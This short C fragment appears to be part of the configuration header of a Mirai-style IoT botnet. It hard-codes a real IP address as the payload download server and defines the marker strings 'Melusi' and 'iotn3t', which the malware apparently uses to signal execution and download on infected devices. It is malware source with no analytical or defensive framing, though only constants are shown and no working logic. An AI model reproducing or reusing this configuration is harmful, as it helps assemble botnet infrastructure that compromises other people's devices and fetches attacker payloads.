...
#define HTTP_SERVER utils_inet_addr(45,156,21,236)//Put IP with commas (,) instead of dots (.)

#define EXEC_MSG            "Melusi\n"
#define EXEC_MSG_LEN        6

#define DOWNLOAD_MSG        "iotn3t\n"
